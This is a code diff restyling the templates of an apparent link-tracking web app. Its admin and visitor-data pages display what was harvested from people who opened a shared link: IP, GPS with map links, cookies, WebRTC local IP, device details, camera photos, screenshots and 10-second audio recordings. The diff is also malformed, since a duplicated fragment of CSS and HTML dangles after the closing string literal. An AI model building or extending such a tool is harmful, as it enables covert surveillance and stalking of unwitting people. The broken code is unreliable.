@@ -302,73 +302,82 @@ ADMIN_PANEL_HTML = """
 ADMIN_USER_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>User Data - {{ user.username }}</title>""" + BASE_CSS + """
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>User Data - {{ user.username }}</title>""" + BASE_CSS + """
 <style>
+.visit-card {
+    background: #0d1520;
+    padding: 18px 15px;
+    border-radius: 16px;
+    margin: 18px 0;
+    border-left: 4px solid #ff0044;
+    text-align: center;
+}
 .visit-card .row {
+    margin-bottom: 10px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #1a2332;
     display: flex;
     flex-direction: column;
-    align-items: flex-start;
-    margin-bottom: 10px;
-    padding-bottom: 6px;
-    border-bottom: 1px solid #1a2332;
+    align-items: center;
 }
 .visit-card .label {
     font-weight: bold;
     color: #6688aa;
-    font-size: 0.9rem;
-    width: 100%;
+    font-size: 0.8rem;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 2px;
 }
 .visit-card .value {
     word-break: break-word;
-    font-size: 1rem;
+    font-size: 0.95rem;
     color: #00ffcc;
-    margin-top: 2px;
-    width: 100%;
+    padding: 0 5px;
 }
 .visit-card img {
-    max-width: 100% !important;
+    max-width: 90% !important;
     height: auto !important;
     border-radius: 12px;
     border: 1px solid #334466;
-    margin: 5px 0;
+    margin: 6px auto;
+    display: block;
 }
 .visit-card audio {
-    max-width: 100% !important;
-    margin: 5px 0;
+    max-width: 90% !important;
+    margin: 6px auto;
+    display: block;
 }
 .map-link {
     display: inline-block;
     margin-left: 6px;
-    font-size: 1rem;
+    font-size: 0.9rem;
 }
-@media (min-width: 600px) {
-    .visit-card .row {
-        flex-direction: row;
-        align-items: baseline;
-    }
-    .visit-card .label {
-        width: 150px;
-        flex-shrink: 0;
-    }
-    .visit-card .value {
-        width: auto;
-        margin-top: 0;
-    }
+.container {
+    max-width: 100%;
+    padding: 10px 12px;
+}
+h1 {
+    font-size: 1.8rem;
+    text-align: center;
+}
+.total-visits {
+    text-align: center;
 }
 </style>
 </head>
 <body>
 <div class="container">
-    <a href="/admin-panel" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Admin Panel</a>
+    <a href="/admin-panel" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.1rem;text-align:center;width:100%;">⬅️ Back to Admin Panel</a>
     <h1>📊 User: {{ user.username }}</h1>
     <p class="total-visits">Total Links: {{ user.links|length }}</p>
-    <a href="/admin-clear-user-data/{{ user.username }}" onclick="return confirm('⚠️ Clear ALL data (links + visits) for this user? Account will remain active.');" style="color:#ffaa00;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🧹 Clear All Data</a>
-    &nbsp;|&nbsp;
-    <a href="/admin-delete-user/{{ user.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🗑️ Delete Account</a>
+    <div style="text-align:center;margin-bottom:20px;">
+        <a href="/admin-clear-user-data/{{ user.username }}" onclick="return confirm('⚠️ Clear ALL data (links + visits) for this user? Account will remain active.');" style="color:#ffaa00;display:inline-block;margin:5px;padding:10px 18px;background:#1a2332;border-radius:10px;font-size:1rem;">🧹 Clear Data</a>
+        <a href="/admin-delete-user/{{ user.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;display:inline-block;margin:5px;padding:10px 18px;background:#1a2332;border-radius:10px;font-size:1rem;">🗑️ Delete Account</a>
+    </div>
 
     {% for link in user.links %}
-    <div class="card">
-        <h3>🔗 {{ link.name }} ({{ link.visits|length }} visits)</h3>
+    <div class="card" style="background:#1a2332;padding:15px;border-radius:12px;margin:18px 0;">
+        <h3 style="text-align:center;color:#b0d4ff;font-size:1.2rem;">🔗 {{ link.name }} ({{ link.visits|length }} visits)</h3>
         {% for v in link.visits %}
         <div class="visit-card">
             <div class="row"><span class="label">IP Address</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
@@ -426,11 +435,11 @@ ADMIN_USER_HTML = """
             <div class="row"><span class="label">Time</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
         </div>
         {% else %}
-        <p style="color:#6688aa;">No visits for this link.</p>
+        <p style="color:#6688aa;text-align:center;">No visits for this link.</p>
         {% endfor %}
     </div>
     {% else %}
-    <p style="color:#6688aa;">No links found.</p>
+    <p style="color:#6688aa;text-align:center;">No links found.</p>
     {% endfor %}
 </div>
 </body>
@@ -440,68 +449,180 @@ ADMIN_USER_HTML = """
 VIEW_LINK_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Visitor Data</title>""" + BASE_CSS + """
 <style>
+/* ঠিক অ্যাডমিন ভিউয়ের মতো স্টাইল, কিন্তু সেন্টার */
+.visit-card {
+    background: #0d1520;
+    padding: 18px 15px;
+    border-radius: 16px;
+    margin: 18px 0;
+    border-left: 4px solid #ff0044;
+    text-align: center;
+}
 .visit-card .row {
+    margin-bottom: 10px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #1a2332;
     display: flex;
     flex-direction: column;
-    align-items: flex-start;
-    margin-bottom: 10px;
-    padding-bottom: 6px;
-    border-bottom: 1px solid #1a2332;
+    align-items: center;
 }
 .visit-card .label {
     font-weight: bold;
     color: #6688aa;
-    font-size: 0.9rem;
-    width: 100%;
+    font-size: 0.8rem;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 2px;
 }
 .visit-card .value {
     word-break: break-word;
-    font-size: 1rem;
+    overflow-wrap: break-word;
+    font-size: 0.95rem;
     color: #00ffcc;
-    margin-top: 2px;
-    width: 100%;
+    padding: 0 5px;
+    max-width: 100%;
 }
 .visit-card img {
-    max-width: 100% !important;
+    max-width: 90% !important;
     height: auto !important;
     border-radius: 12px;
     border: 1px solid #334466;
-    margin: 5px 0;
+    margin: 6px auto;
+    display: block;
 }
 .visit-card audio {
-    max-width: 100% !important;
-    margin: 5px 0;
+    max-width: 90% !important;
+    margin: 6px auto;
+    display: block;
 }
 .map-link {
     display: inline-block;
     margin-left: 6px;
-    font-size: 1rem;
+    font-size: 0.9rem;
 }
 .del-btn {
     display: inline-block;
-    margin-top: 10px;
+    margin-top: 12px;
+    padding: 12px 25px;
+    background: #ff004422;
+    border: 1px solid #ff0044;
+    border-radius: 10px;
+    color: #ffccbb;
+    text-decoration: none;
+    font-size: 1rem;
+    text-align: center;
+    width: 100%;
+    box-sizing: border-box;
 }
-@media (min-width: 600px) {
-    .visit-card .row {
-        flex-direction: row;
-        align-items: baseline;
-    }
-    .visit-card .label {
-        width: 150px;
-        flex-shrink: 0;
-    }
-    .visit-card .value {
-        width: auto;
-        margin-top: 0;
-    }
+.container {
+    max-width: 100%;
+    padding: 10px 12px;
+}
+h1 {
+    font-size: 1.8rem;
+    text-align: center;
+}
+.total-visits {
+    text-align: center;
 }
 </style>
 </head>
 <body>
 <div class="container">
-    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Dashboard</a>
+    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.1rem;text-align:center;width:100%;">⬅️ Back to Dashboard</a>
+    <h1>📊 {{ link.name }}</h1>
+    <p class="total-visits">Total Visits: {{ link.visits|length }}</p>
+
+    {% if link.visits %}
+        {% for v in link.visits %}
+        <div class="visit-card">
+            <div class="row"><span class="label">IP Address</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Location</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
+            <div class="row"><span class="label">GPS (Lat, Lng)</span> <span class="value">{{ v.get('gps', 'N/A') }}
+                {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
+                    <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
+                {% endif %}
+            </span></div>
+            <div class="row"><span class="label">Browser / OS</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Screen</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Language</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Platform</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Timezone</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Battery Level</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Memory (GB)</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Cookies</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Referrer</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+
+            <div class="row"><span class="label">Device Model</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Network Type</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Downlink Speed</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
+            <div class="row"><span class="label">CPU Cores</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Local IP (WebRTC)</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Storage (Free/Total)</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
+
+            <div class="row"><span class="label">Camera</span>
+                <span class="value">
+                {% if v.get('camera') and v.get('camera') != 'Failed' %}
+                    <img src="{{ v.get('camera') }}" />
+                {% else %}
+                    N/A
+                {% endif %}
+                </span>
+            </div>
+            <div class="row"><span class="label">Screenshot</span>
+                <span class="value">
+                {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
+                    <img src="{{ v.get('screenshot') }}" />
+                {% else %}
+                    N/A
+                {% endif %}
+                </span>
+            </div>
+            <div class="row"><span class="label">Audio (10s)</span>
+                <span class="value">
+                {% if v.get('audio') and v.get('audio') != 'Failed' %}
+                    <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
+                {% else %}
+                    N/A
+                {% endif %}
+                </span>
+            </div>
+            <div class="row"><span class="label">Time</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
+            <a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️ Delete this visit</a>
+        </div>
+        {% endfor %}
+    {% else %}
+        <p style="color:#6688aa;font-size:1.2rem;text-align:center;">No visits yet. Share your link to collect data.</p>
+    {% endif %}
+</div>
+</body>
+</html>
+"""
+    color: #ffccbb;
+    text-decoration: none;
+    font-size: 1rem;
+    text-align: center;
+    width: 100%;
+    box-sizing: border-box;
+}
+.container {
+    max-width: 100%;
+    padding: 10px 12px;
+}
+h1 {
+    font-size: 1.8rem;
+    text-align: center;
+}
+.total-visits {
+    text-align: center;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.1rem;text-align:center;width:100%;">⬅️ Back to Dashboard</a>
     <h1>📊 {{ link.name }}</h1>
     <p class="total-visits">Total Visits: {{ link.visits|length }}</p>
 
@@ -565,7 +686,7 @@ VIEW_LINK_HTML = """
         </div>
         {% endfor %}
     {% else %}
-        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to collect data.</p>
+        <p style="color:#6688aa;font-size:1.2rem;text-align:center;">No visits yet. Share your link to collect data.</p>
     {% endif %}
 </div>
 </body>
